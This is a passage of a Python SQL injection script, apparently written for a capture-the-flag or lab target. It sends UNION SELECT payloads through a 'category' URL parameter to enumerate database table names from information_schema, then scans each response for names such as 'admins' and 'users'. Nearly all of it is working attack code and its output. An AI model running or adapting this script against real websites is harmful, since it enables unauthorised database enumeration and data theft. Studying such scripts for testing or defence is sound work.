r = session.get(target + "?category=" + urllib.parse.quote(payload))
print(f"Size: {len(r.text)} bytes")
print(f"Full response:\n{r.text}")

# Test 9: Get all table names explicitly
print("\n[9] Getting all table names:")
for i in range(5):
    print(f"\n[9.{i}] Table {i}:")
    payload = f"Nature' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1#"
    r = session.get(target + "?category=" + urllib.parse.quote(payload))
    print(f"Size: {len(r.text)} bytes")
    
    # Look for table names in response
    text = r.text
    # Find words that are lowercase and look like table names
    import re
    words = re.findall(r'\b[a-z_]+\b', text)
    common_tables = ['posts','categories','admins','users','accounts','blog','nature','tech','cooking']
    tables = [w for w in words if w in common_tables]
    print(f"Tables found in response: {list(set(tables))}")
    print(f"Response snippet:\n{text[:500]}")

print("\n"+"="*80)
print("ANALYSIS COMPLETE")
print("="*80)
